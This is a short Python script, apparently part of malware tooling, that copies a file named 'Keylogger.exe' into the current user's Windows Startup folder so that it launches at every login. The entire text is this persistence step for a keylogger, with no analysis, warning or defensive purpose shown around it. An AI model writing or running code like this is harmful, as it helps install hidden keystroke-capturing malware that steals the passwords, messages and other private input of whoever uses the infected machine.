import os
import shutil

file_name = 'Keylogger.exe'
startup_folder = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', file_name)

shutil.copy(file_name, startup_folder)
